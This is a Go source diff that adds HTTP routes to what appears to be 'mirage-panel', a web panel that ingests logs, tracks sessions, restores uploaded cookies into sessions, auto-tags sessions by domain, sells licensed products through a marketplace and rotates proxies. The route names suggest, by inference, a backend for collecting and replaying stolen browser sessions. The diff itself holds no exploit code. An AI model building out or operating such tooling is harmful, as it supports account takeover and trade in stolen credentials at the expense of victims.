@@ -5,6 +5,7 @@ import (
 	"database/sql"
 	"net/http"
 	"strings"
+	"time"
 
 	"github.com/go-chi/chi/v5"
 	"github.com/user/mirage-panel/internal/auth"
@@ -101,6 +102,20 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 		r.Post("/api/sessions/{id}/unlock", sessionsHandler.Unlock)
 
 		r.Get("/api/search", searchHandler.Search)
+		r.Get("/api/search/advanced", searchHandler.AdvancedSearch)
+
+		detectHandler := NewDuplicateDetectHandler(db)
+		r.Get("/api/detect/duplicates", detectHandler.Detect)
+
+		domainDetectHandler := NewDomainDetectHandler(db)
+		r.Get("/api/domain-detect", domainDetectHandler.List)
+		r.Post("/api/domain-detect", domainDetectHandler.Create)
+		r.Delete("/api/domain-detect/{id}", domainDetectHandler.Delete)
+		r.Post("/api/sessions/{id}/auto-tag", domainDetectHandler.AutoTag)
+
+		r.Get("/api/filter-presets", NewFilterPresetsHandler(db).List)
+
+		r.Patch("/api/sessions/{id}/viewed", sessionsHandler.MarkViewed)
 
 		r.Post("/api/log", logsHandler.Ingest)
 		r.Post("/api/log/chunk", logsHandler.Chunk)
@@ -125,7 +140,11 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 		r.Get("/api/settings", settingsHandler.Get)
 		r.Put("/api/settings", settingsHandler.Update)
 
+		// Cookie restore
 		r.Post("/api/restore/cookies", restoreHandler.Restore)
+		r.Post("/api/restore/cookies/upload", restoreHandler.UploadCookies)
+		r.Get("/api/restore/sessions", restoreHandler.ListSessions)
+		r.Get("/api/restore/sessions/{id}", restoreHandler.SessionStatus)
 
 		r.With(middleware.RequireRole("admin")).Get("/api/users", usersHandler.List)
 		r.With(middleware.RequireRole("admin")).Post("/api/users/invite", usersHandler.CreateInvite)
@@ -147,7 +166,36 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 		r.Post("/api/marketplace/purchase", marketplaceHandler.Purchase)
 		r.Post("/api/marketplace/activate", marketplaceHandler.Activate)
 		r.Get("/api/marketplace/purchases", marketplaceHandler.MyPurchases)
+		r.Post("/api/marketplace/renew", marketplaceHandler.RenewLicense)
+		r.Post("/api/marketplace/upgrade", marketplaceHandler.UpgradeLicense)
+		r.Get("/api/marketplace/license-status", marketplaceHandler.LicenseStatus)
+		r.Post("/api/auth/start-trial", marketplaceHandler.StartTrial)
 		r.With(middleware.RequireRole("admin")).Post("/api/marketplace/products", marketplaceHandler.CreateProduct)
 		r.With(middleware.RequireRole("admin")).Delete("/api/marketplace/products/{id}", marketplaceHandler.DeleteProduct)
+
+		// Proxies
+		rotator := services.NewProxyRotator(nil)
+		store := services.NewSettingsStore(
+			func(key string) (string, error) {
+				var val string
+				err := db.QueryRow("SELECT value FROM settings WHERE key = ?", key).Scan(&val)
+				return val, err
+			},
+			func(key, value string) error {
+				_, err := db.Exec("INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
+				return err
+			},
+		)
+		if entries, err := services.LoadProxies(store); err == nil {
+			for _, e := range entries {
+				rotator.Add(e)
+			}
+		}
+		proxyHandler := services.NewProxyRotatorHandler(rotator, store)
+		go rotator.HealthCheck(context.Background(), 5*time.Minute)
+
+		r.With(middleware.RequireRole("admin")).Get("/api/proxies", proxyHandler.ListProxies)
+		r.With(middleware.RequireRole("admin")).Post("/api/proxies", proxyHandler.AddProxy)
+		r.With(middleware.RequireRole("admin")).Delete("/api/proxies/{id}", proxyHandler.DeleteProxy)
 	})
 }
